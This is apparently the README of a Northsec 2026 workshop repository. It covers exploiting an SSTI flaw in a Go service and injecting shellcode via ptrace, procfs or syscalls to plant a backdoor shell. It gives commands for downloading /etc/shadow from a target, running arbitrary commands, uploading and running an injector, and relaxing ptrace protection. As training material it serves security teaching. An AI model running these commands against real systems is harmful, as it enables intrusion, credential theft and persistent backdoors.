# Shellcoding the Unshellable: Process Hooking & Advanced Shellcoding in Hardened Go Containers
## A workshop for Northsec 2026

This repository contains the code and resources for the workshop.  
To enter the discord channel, send workshop-1443 to FLAGBOT on the Northsec Discord server.  
Your job is to implement `injector-boilerplate/` to get an interactive shell in the target container.

## Setting up the virtual environment

To set up the python virtual environment, run the following commands:
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Structure of the repo
`gadgets.py` - A script that exploits the SSTI vulnerability in the target application and provide Read/Write/Execute capabilities.  
`templates/` - Contains jinja2 templates used by gadgets.py  
`base64-small` - A small base64 encoder/decoder that can be used to encode/decode shellcode. Used for multiple-stage setup of gadgets.py when dealing with a scratch container, as it's a small, self-contained binary that runs a lot faster than a pure bash decoder. Not necessary since we're not using a scratch container for this workshop.
`injector/` - Contains the completed code used to inject shellcode into the target process, along with the code for the hook itself.
`injector-boilerplate/` - Contains the skeleton code for the injector, to be completed by the participants. This is the main focus of the red team part of the workshop.
`shell.py` - Simple python script that triggers the backdoor and provides an interactive shell.

## gadgets.py
This is a python toolkit to automate exploitation of the SSTI vulnerability in the target application. It allows an easy to use interface for running arbitrary single commands on the system and, most importantly, large and non-textual file download and upload.  
```bash
python ./gadgets.py -u https://your-target-url.com -p some-valid-product-id download /etc/shadow
python ./gadgets.py -u https://your-target-url.com -p some-valid-product-id upload ./injector /tmp/injector
python ./gadgets.py -u https://your-target-url.com -p some-valid-product-id execute whoami
```

## base64-small
To build:
```bash
cargo build --release --target x86_64-unknown-linux-musl
```
The executable can then be found in `target/x86_64-unknown-linux-musl/release/base64-small`

Usage:
```bash
echo -n "dGVzdA==" | base64-small
```

## injector
To build:
```bash
cargo build --release --target x86_64-unknown-linux-musl
```
The executable can then be found in `target/x86_64-unknown-linux-musl/release/injector`

Usage:
```bash
# Inject via ptrace  
sudo injector ptrace $(pidof sandbox-svc-review)  
# Inject via procfs  
sudo injector procfs $(pidof sandbox-svc-review)
# Inject via syscall  
sudo injector syscall $(pidof sandbox-svc-review)  
```

If you don't want to run the injector as sudo, you can allow same-user ptrace until next reboot by setting `kernel.yama.ptrace_scope` to 0:
```bash
sudo sysctl kernel.yama.ptrace_scope=0
```

### asm.rs
Contains assembly code and ropchains for the exploit. The ropchain is only used when injecting via syscall.

### constants.rs
Contains constant values used in the exploit. This is where you can set the memory addresses to inject shellcode into.

### main.rs
The entry point of the exploit. Also handles CLI arguments.

### procfs.rs
Handles injecting shellcode via procfs.

### ptrace.rs
Handles injecting shellcode via ptrace. This is the method we will be focusing on fot the workshop.

### syscall.rs
Handles injecting shellcode via syscall. Harder than the other methods because it does not bypass page memory protections(you cannot write to a read-only memory page)

## shell.py
Triggers the backdoor and gives you an interactive shell.
```bash
python3 shell.py http://localhost 8080
```

### sandbox-svc-review
The sandbox service that is being exploited. Not committed to the repository, you will need to use the SSTI vulnerability to fetch it.
Usage:
```bash
SVC_CHARACTERISTICS_FILE=/tmp/char REDIS_URL=<redir-url> GOMAXPROCS=1 ./sandbox-svc-review
```
SVC_CHARACTERISTICS_FILE: Path to a file where the service characteristics will be written. Required for the service to run, can be any writable path.
GOMAXPROCS: Max number of concurrent processes to use. We will use 1 for this workshop to avoid additional complexity with the injection process.
